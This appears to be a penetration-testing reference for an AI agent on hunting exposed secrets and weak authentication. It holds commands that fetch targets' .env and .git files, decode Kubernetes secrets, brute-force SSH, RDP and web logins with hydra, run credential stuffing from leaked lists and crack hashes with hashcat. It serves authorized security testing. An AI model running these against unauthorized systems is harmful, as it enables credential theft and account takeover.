# Auth & Secrets Reference

## Goal
Find exposed credentials, API keys, tokens, and weak authentication — in source code,
running applications, configs, and git history.

---

## trufflehog — Secrets in Code / Git

```bash
# Scan a local git repo (all history)
trufflehog git file://./repo --json | jq . | tee ./secrets/trufflehog-git.json

# Scan a remote GitHub repo
trufflehog github --repo https://github.com/org/repo --json | tee ./secrets/trufflehog-github.json

# Scan entire GitHub org
trufflehog github --org $ORG_NAME --token $GITHUB_TOKEN --json

# Scan a running web app (crawls and checks responses)
trufflehog filesystem --directory /path/to/extracted/app

# Scan Docker image
trufflehog docker --image $IMAGE_NAME --json

# Only verified secrets (reduces false positives significantly)
trufflehog git file://./repo --only-verified --json
```

### What to Look For
```
AWS_ACCESS_KEY / AWS_SECRET_ACCESS_KEY
GITHUB_TOKEN / GITLAB_TOKEN
DATABASE_URL with embedded credentials
PRIVATE_KEY / RSA PRIVATE KEY blocks
Stripe/Twilio/SendGrid API keys
JWT secrets / signing keys
.env files committed to history
```

---

## Manual Secret Discovery

### In Web Responses
```bash
# Check JS files for hardcoded secrets
curl -sk $TARGET | grep -oE 'api[_-]?key["\s:=]+["\047][^"'\'']{20,}' 
curl -sk $TARGET/static/app.js | grep -iE 'secret|apikey|password|token|auth'

# Exposed .env files
curl -sk $TARGET/.env
curl -sk $TARGET/.env.local $TARGET/.env.backup $TARGET/.env.prod

# Exposed git
curl -sk $TARGET/.git/config
curl -sk $TARGET/.git/HEAD
# If accessible: use git-dumper to extract full repo
git-dumper $TARGET/.git ./extracted-repo
```

### In Docker / Container
```bash
# Inspect image for env vars with secrets
docker inspect $CONTAINER | jq '.[].Config.Env'
docker history $IMAGE --no-trunc | grep -i "secret\|key\|pass\|token"

# Check for secrets mounted as files
docker exec $CONTAINER find / -name "*.env" -o -name "*.key" -o -name "secrets" 2>/dev/null
```

### In Kubernetes
```bash
kubectl get secrets --all-namespaces
kubectl get secret $SECRET_NAME -o jsonpath='{.data}' | jq 'to_entries[] | .key, (.value | @base64d)'
```

---

## hydra — Credential Strength Testing

Use hydra to validate whether an authentication endpoint is vulnerable to weak or
guessable credentials. Claude should not generate password lists or credential
combinations — provide hydra with established wordlists and let it perform the testing.

**Use only on authorized targets. Always use --batch equivalent flags.**

```bash
# HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  $TARGET http-get /admin

# HTTP POST form login
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  $TARGET http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -V -t 10

# With JSON body (API login)
# Use ffuf for JSON-body credential testing (hydra doesn't handle JSON natively)
ffuf -w /usr/share/wordlists/rockyou.txt \
  -u $TARGET/api/login \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -fc 401 -t 5

# SSH credential test
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  $TARGET ssh -t 4

# FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  $TARGET ftp

# RDP
hydra -l administrator -P ./wordlists/passwords.txt \
  $TARGET rdp -t 1

# MySQL
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  $TARGET mysql

# Credential stuffing test with known leaked-credential list
hydra -C ./secrets/leaked-creds.txt $TARGET http-post-form \
  "/login:username=^USER^&password=^PASS^:Failed"
```

### Smart Wordlist Selection
```bash
# Generate target-specific wordlist (CeWL — crawl + extract words)
cewl $TARGET -d 3 -m 8 -w ./secrets/custom-wordlist.txt

# Rule-based mutation (hashcat rules on a base list)
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule ./secrets/custom-wordlist.txt \
  > ./secrets/mutated-wordlist.txt
```

---

## Default Credential Checks

Before running hydra, always try defaults manually:

| Service       | Common Defaults                          |
|---------------|------------------------------------------|
| Router/IoT    | admin:admin, admin:password, admin:1234  |
| Jenkins       | admin:admin                              |
| Grafana       | admin:admin                              |
| Tomcat        | admin:admin, tomcat:tomcat               |
| phpMyAdmin    | root: (empty), root:root                 |
| Elasticsearch | (no auth by default — just try GET /)    |
| MongoDB       | (no auth by default on older versions)   |
| Redis         | PING → +PONG (no auth)                   |
| Jupyter       | (no auth by default on local installs)   |

```bash
# Quick check for unauthenticated services
redis-cli -h $TARGET ping
curl -sk $TARGET:9200  # Elasticsearch
curl -sk $TARGET:27017 # MongoDB (shouldn't respond but some do)
```

---

## Password Hash Cracking

If you recover hashes from a database dump:

```bash
# Identify hash type
hashid '$2y$10$...'

# Crack with hashcat
hashcat -m 3200 ./secrets/hashes.txt /usr/share/wordlists/rockyou.txt  # bcrypt
hashcat -m 0 ./secrets/hashes.txt /usr/share/wordlists/rockyou.txt      # MD5
hashcat -m 1800 ./secrets/hashes.txt /usr/share/wordlists/rockyou.txt   # sha512crypt

# Online: crackstation.net for unsalted MD5/SHA
```
